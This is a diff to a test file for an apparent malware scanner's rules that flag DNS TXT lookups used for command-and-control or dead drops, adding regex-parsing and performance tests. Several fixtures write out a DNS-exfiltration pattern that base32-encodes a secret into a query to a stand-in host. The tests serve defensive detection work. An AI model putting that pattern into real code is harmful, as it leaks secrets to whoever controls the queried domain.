@@ -172,7 +172,8 @@ describe("C2_DOH_RESOLVER and DEAD_DROP_DNS_TXT need a C2 signal for medium", ()
   it("stays linear on lines of comma-separated assignments above many hits", { timeout: performanceBudget(60_000) }, () => {
     const assignments = "a=1,".repeat(1_000);
     const block = [assignments, assignments, assignments, assignments, assignments, "dns.resolveTxt(q);"].join("\n");
-    const content = Array.from({ length: 3_000 }, () => block).join("\n");
+    // About 5 MiB; a value read to the end of its line would be quadratic here.
+    const content = Array.from({ length: 262 }, () => block).join("\n");
     const started = performance.now();
     severities("DEAD_DROP_DNS_TXT", content);
     expect(performance.now() - started).toBeLessThan(performanceBudget(5_000));
@@ -203,17 +204,34 @@ describe("C2_DOH_RESOLVER and DEAD_DROP_DNS_TXT need a C2 signal for medium", ()
     expect(found).toEqual(["medium"]);
   });
 
-  it("reads a helper full of regex-like text to its end without spending the budget", () => {
-    // Each unclosed class is read for at most a few hundred characters, so one
-    // such helper does not exhaust the file's budget and the benign lookup stays low.
-    const content = [
-      "function h() {",
-      "  " + "=/[".repeat(5_000),
-      "}",
-      ...Array.from({ length: 6 }, (_, i) => `// filler ${i}`),
-      "dns.resolveTxt(h());",
+  it("skips regex literals inside a helper, and counts one it cannot read to the end as a signal", () => {
+    // A short regex holding a brace is skipped: the benign helper stays low.
+    const benign = [
+      "function q(d) { const r = /}/; return d.trim(); }",
+      "dns.resolveTxt(q(domain));",
     ].join("\n");
-    expect(severities("DEAD_DROP_DNS_TXT", content)).toEqual(["low"]);
+    expect(severities("DEAD_DROP_DNS_TXT", benign)).toEqual(["low"]);
+    // After a keyword a slash starts a regex, so its brace does not close the helper.
+    const keyword = [
+      "function q(d) { return /[}]/.test(d) ? d : base32(d); }",
+      "dns.resolveTxt(q(secret) + '.x.example');",
+    ].join("\n");
+    expect(severities("DEAD_DROP_DNS_TXT", keyword)).toEqual(["medium"]);
+    // A regex longer than the scan reads is not guessed at: the helper scan counts
+    // as incomplete, so even a helper that encodes nothing gives medium.
+    const longRegex = [
+      `function q(d) { const r = /${"a".repeat(300)}}/; return d.trim(); }`,
+      "dns.resolveTxt(q(secret) + '.x.example');",
+    ].join("\n");
+    expect(severities("DEAD_DROP_DNS_TXT", longRegex)).toEqual(["medium"]);
+  });
+
+  it("stays linear on assignments that start inside the previous value", { timeout: performanceBudget(60_000) }, () => {
+    const hostile = "x(" + "a=(".repeat(Math.floor((5 * 1024 * 1024) / 3));
+    const content = [hostile, "dns.resolveTxt(q, cb);"].join("\n");
+    const started = performance.now();
+    severities("DEAD_DROP_DNS_TXT", content);
+    expect(performance.now() - started).toBeLessThan(performanceBudget(5_000));
   });
 
   it("does not count comparisons with eval or Function as a sink", () => {
